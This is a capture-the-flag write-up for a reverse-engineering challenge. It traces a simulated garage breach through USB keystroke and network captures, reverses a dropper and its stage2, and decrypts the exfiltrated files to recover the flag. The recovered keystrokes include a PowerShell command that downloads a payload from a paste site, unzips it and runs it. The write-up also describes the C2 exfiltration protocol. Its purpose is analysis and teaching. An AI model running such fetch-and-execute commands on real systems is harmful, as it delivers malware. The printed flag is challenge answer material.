# What did you type - Reverse Engineering CTF Write Up

<img width="678" height="533" alt="image" src="https://github.com/user-attachments/assets/4ce54fbe-5a3c-4cf4-a2f6-042485bd3e45" />

Difficulty: Medium

Category: Reverse Engineering

---

Description:

We’re an automotive security startup. Last night, our garage was breached (yeah, we're still garage-based :| ). We managed to capture some logs via our first-ever agent. Can you analyze them and find out what was taken? Good luck!

Author: Reisen_1943 (Ze:R0)

---

Files:

- `monitor_hardware` (USB PCAP)
- `monitor_network` (network PCAP)

---

### Initial Triage

First pass on both captures:

```sh
$ file monitor_hardware
monitor_hardware: pcap capture file ... (USB with USBPcap header)

$ file monitor_network
monitor_network: pcap capture file ... (Ethernet)
```

From network capture, we can immediately see suspicious HTTP traffic to:

- C2: `192.168.52.163:9999` (Werkzeug/Flask)
- host: `for-ultramar.com:9999`
- endpoint: `GET /` then multiple `POST /upload`
- user-agent: `Inquisition`

The extracted HTTP objects show filename uploads and encrypted body uploads.

Observed filename/body pairs:

- `Cool_Story.docx` -> `upload(2)`
- `hello_darkness_my_old_friend.txt` -> `upload(6)`
- `IDK_why_I_saved_this.xlsx` -> `upload(10)`
- `sexy_picture.jpg` -> `upload(14)`

  <img width="466" height="337" alt="image" src="https://github.com/user-attachments/assets/ac8e2ba0-b56a-43c3-84f8-68a2d2c28309" />

---

### Network Artifact Review

The first response body from `GET /` is a 32-byte token:

```text
66c9c5a2015ff2be075f3d430031f54d22f8ad7194363889a019350937946d74
```

Payloads in `upload(2|6|10|14)` are encrypted and not plaintext.

So at this stage we know:

1. Exact files that were taken
2. Encrypted file bodies
3. A token retrieved before exfil

---

### Critical Pivot (USB HID)

Big pivot: decode keyboard events from `monitor_hardware`.

Extracting HID reports (`usbhid.data`) revealed attacker typing history. Reconstructed commands included:

```text
powershell
ls
cd Documents
ls
[IO.File]::WriteAllBytes("$pwd\sus.zip", [Convert]::FromBase64String((irm 'https://0x0.st/PbWE.txt')))
ls
unzip -P 1m_g0d_!! sus.zip -d out
mv out\* .
./module.exe
rm *
exit
```

Two key intel points:

1. URL: `https://0x0.st/PbWE.txt`
2. ZIP password: `1m_g0d_!!`

This validated the operator workflow and gave us the original dropped `module.exe` sample path.

---

### Binary + Stage2 Reversing

Recovered executable behavior (Wine + static RE):

- Main module contacts C2 (`for-ultramar.com`)
- Pulls token from `GET /`
- Decrypts embedded resource and executes stage2 code
- Stage2 performs exfil to `/upload`

For dynamic analysis, I ran a fake C2 server (`fake_c2.py`) returning the correct 32-byte value from the pcap, with `for-ultramar.com` pointed at localhost via the hosts file (see `VM_RUNTIME_PLAN.txt` for the full dynamic setup).

This gave an oracle:

- known plaintext: `fcn_4f1_pdc.txt`, `stage2_objdump.txt`
- known ciphertext uploads from mock logs
  
---

### RVA -> Raw File Offset

Important IDA observations in `module.exe`:

- main execution path around: `0x140003cc0`
- AES helper path used for embedded blob decrypt:
  - key schedule area around `0x140001000`
  - setup/helper around `0x140001480`, `0x1400029c0`, `0x140002a40`, `0x140002aa0`
- SHA-256 helpers around:
  - `0x140002b70` (init)
  - `0x140003110` (update)
  - `0x140003300` (final)
  - `0x140003420` (digest output)

Resource table check (PE):

- resource type `255`, name `254`
- `RVA = 0x00c0a0`
- `size = 0x8ee0` (36576 bytes)
- converted raw file offset = `0x8ea0`

I validated this with a script created by ChatGPT(saviour):

```sh
python3 - << 'PY'
import pefile
pe=pefile.PE('module.exe')
for e in pe.DIRECTORY_ENTRY_RESOURCE.entries:
    for e2 in e.directory.entries:
        for e3 in e2.directory.entries:
            d=e3.data.struct
            off=pe.get_offset_from_rva(d.OffsetToData)
            print('type',e.id,'name',e2.id,'rva',hex(d.OffsetToData),'size',d.Size,'off',hex(off))
PY
```

Extracted this resource at `off=0x8ea0`, decrypted it with the token path
from RE, and confirmed it becomes stage2 shellcode (`W1 C0 B9 0A ...`).

---

### Exfil Cipher Derivation

From repeated known plaintext/ciphertext pairs, the file-body encryption was derived as:

- ciphertext format: `prefix4 || aes_cbc_ciphertext`
- `prefix4`: first 4 bytes of upload body
- key: `SHA256(prefix4)`
- iv: `0f0e0d0c0b0a09080706050403020100`
- mode: `AES-256-CBC`
- padding: PKCS7

```python
#!/usr/bin/env python3
import argparse
import hashlib
from pathlib import Path
from Crypto.Cipher import AES

IV = bytes.fromhex("0f0e0d0c0b0a09080706050403020100")

def pkcs7_unpad(data: bytes) -> bytes:
    if not data:
        return data
    pad = data[-1]
    if 1 <= pad <= 16 and data.endswith(bytes([pad]) * pad):
        return data[:-pad]
    return data

def decrypt_upload_blob(blob: bytes) -> bytes:
    if len(blob) < 4:
        raise ValueError("blob too short")
    prefix4 = blob[:4]
    ciphertext = blob[4:]
    key = hashlib.sha256(prefix4).digest()
    plain_padded = AES.new(key, AES.MODE_CBC, IV).decrypt(ciphertext)
    return pkcs7_unpad(plain_padded)

def main():
    ap = argparse.ArgumentParser(description="Decrypt one exfil upload body")
    ap.add_argument("-i", "--input", required=True, help="encrypted upload body file")
    ap.add_argument("-o", "--output", required=True, help="output plaintext file")
    args = ap.parse_args()

    enc = Path(args.input).read_bytes()
    dec = decrypt_upload_blob(enc)
    Path(args.output).write_bytes(dec)
    print(f"[+] Wrote {len(dec)} bytes to {args.output}")

if __name__ == "__main__":
    main()
```

---

### Decrypting Stolen Files

Using the code on original capture files, we can then decrypt using:

```sh
python3 decrypt_upload.py -i http_objs/upload\(2\)  -o [filename]
```

- `upload(2)` -> valid `Cool_Story.docx`
- `upload(6)` -> valid `hello_darkness_my_old_friend.txt`
- `upload(10)` -> valid `IDK_why_I_saved_this.xlsx`
- `upload(14)` -> valid `sexy_picture.jpg`

File types after decryption were (`docx/xlsx/txt/jpg`).

---

### Flag Recovery

Flag parts were split across different stolen artifacts.

Part 1 (`xlsx`):

<img width="369" height="176" alt="image" src="https://github.com/user-attachments/assets/5c9c4302-d57f-4511-b646-69e8cbb244fb" />

```text
CMO{Dumb357
```

Part 2 (`jpg`):

<img width="977" height="487" alt="image" src="https://github.com/user-attachments/assets/6709729a-f7a0-4c7c-b6a6-aa25438d759f" />

```text
_P3r50n_
```

Part 3 (`docx`):

<img width="616" height="539" alt="image" src="https://github.com/user-attachments/assets/c6ccb43b-b391-48c7-94db-fabdbe7a39ba" />

- `word/header2.xml` watermark string contained:

```text
1n_7h3_M1lky_W4y_!!!}
```

Concatenation:

```text
CMO{Dumb357_P3r50n_1n_7h3_M1lky_W4y_!!!}
```

---

### Final Flag

```text
CMO{Dumb357_P3r50n_1n_7h3_M1lky_W4y_!!!}
```
